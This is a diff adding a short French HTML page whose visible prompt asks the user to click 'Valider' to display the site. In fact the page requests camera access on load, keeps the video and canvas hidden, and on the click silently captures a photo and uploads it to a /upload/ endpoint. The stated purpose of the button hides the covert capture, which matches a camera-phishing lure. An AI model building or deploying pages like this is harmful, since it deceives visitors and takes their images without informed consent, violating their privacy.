@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Prendre un Selfie automatique</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+      background-color: #f5f5f5;
+    }
+    #validerBtn {
+      padding: 15px 40px;
+      font-size: 20px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Cliquez sur le bouton pour afficher le site</h2>
+  <button id="validerBtn">Valider</button>
+
+  <video id="video" autoplay playsinline style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const button = document.getElementById('validerBtn');
+
+    // Demander l’accès à la caméra dès l’ouverture de la page
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(() => {
+        alert("🚫 Veuillez autoriser l’accès à la caméra.");
+      });
+
+    button.addEventListener('click', () => {
+      setTimeout(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL('image/png');
+
+        fetch('/upload/', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'image=' + encodeURIComponent(imageData)
+        })
+        .then(res => res.json())
+        .then(data => {
+          if (data.status === 'success') {
+            alert("✅ Selfie sauvegardé avec succès !");
+          } else {
+            alert("❌ Erreur lors de l’envoi du selfie.");
+          }
+        });
+      }, 500); // délai pour que la capture soit correcte
+    });
+  </script>
+
+</body>
+</html>
